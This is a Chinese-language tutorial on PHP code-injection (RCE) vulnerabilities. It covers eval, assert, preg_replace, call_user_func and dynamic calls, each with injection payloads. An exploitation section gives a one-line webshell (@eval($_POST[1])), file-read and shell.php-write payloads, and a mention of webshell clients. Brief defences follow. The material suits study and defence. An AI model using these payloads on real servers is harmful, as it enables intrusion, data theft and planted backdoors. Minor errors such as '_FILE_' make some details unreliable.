#### 代码注入的原理和成因

代码执行（注入）（RCE，remote code execution ）是指应用程序过滤不严，用户可以通过请求将代码注入到应用中执行。代码执行（注入）类似于SQL注入漏洞，SQL注入是将SQL语句注入到数据库中执行，而代码执行则是可以把代码注入到应用中最终由服务器运行它。这样的漏洞如果没有特殊的过滤，相当于有一个web后门的存在，危险性很大

##### 成因：

1. 程序中含有可以执行PHP代码的函数或者语言结构
2. 传入第一点中的参数，客户端可控，能直接修改或影响

#### 漏洞危害

web应用如果存在代码执行漏洞是一件非常可怕的事情，就像一个人没有穿衣服，赤裸裸的的暴露在光天化日下的。可以通过代码执行漏洞继承web用户权限，执行任意代码。如果具有服务器没有正确配置，web用户权限比较高的话，我们可以读写目标服务器任意文件内容，甚至控制整个网站以及服务器。

PHP中很多函数和语句都会造成PHP代码执行漏洞

#### 相关函数和语句

1. **eval()**，会将字符串当作php代码执行

   测试代码如下：

   - 提交参数

      `?code=phpinfo();`

      也可以是`?code=${phpinfo()};`、`?code=1;phpinfo();`

2. **assert()**，同样会作为PHP代码执行

    - 提交参数

    `?code=phpinfo()`，无论是否加入分号都可以被执行

3. **preg_replace()**，这个函数作用是对字符串进行正则处理

    `<?php`

    `$str=preg_replace('/a/','b',"abcdefgajest");`

    `echo $str`

    `?>`

    查找a替换成b，输出结果为bbcdefgajest，要注意preg_replace()中是正则公式，所以使用双斜杠标记需要查找的内容

    - 提交参数

        `?code=[phpinfo()]`

4. **call_user_func()**，都有调用其他函数的功能，其中一个参数作为要调用的函数名，如果传入的函数名可控，那就可以调用意外的函数来执行想要的代码，也就是存在任意代码执行漏洞

    - 提交参数

    `?fun=assert&para=phpinfo()`

5. 动态函数**$a($b)**，由于PHP本身特性，PHP函数支持直接由拼接的方式调用，导致了PHP在安全上的控制加大了难度。不少知名程序也用到了动态函数的写法，这种写法跟使用了call_user_func()的初衷一样，用来更加方便的调用函数，但是一旦过滤不严格就会造成代码执行漏洞

    - 提交参数

    `?a=assert&b=phpinfo()`

#### 漏洞利用

1. 直接获取shell

    - 提交参数

        `?code=@eval($_POST[1]);`

        `?code=@eval($_REQUEST[1]);`

        输入命令即可构成一句话木马，密码是1，可以使用"中国菜刀"或者"中国蚁剑"连接

2. 获取当前文件的绝对路径，`_FILE_`是PHP的预定义常量，其含义是当前文件的路径

    - 提交参数

        `?code=print(_FILE_)`

3. 读文件，file_get_contents()，读取服务器任意文件，前提是需要知道目标文件路径和读取权限

    - 提交参数，读取设备的hosts

        `?code=var_dump(file_get_contents('c:\windows\system32\drivers\etc\hosts'))`

4. 写文件，file_put_contents()，写入文件，前提是知道可写目录

    -   提交参数

        `?code=file_put_contents($_POST[1],$_POST[2]);`

        此时需要借助hackbar通过post方式提交参数

        `1=shell.php&2=<?php phpinfo()?>`，这样就可以当前目录下创建一个shell.php文件，包含phpinfo命令

#### 漏洞防御方法

1.  尽量不要使用**eval**，等其他函数
2.  如果必须使用，一定要进行严格的过滤
3.  preg_replace，放弃使用/e修饰符
4.  修改php.ini配置文件，禁用相关的函数。在php.ini中找到**disable_funcions =** ，等号后面加上需要禁用的函数

  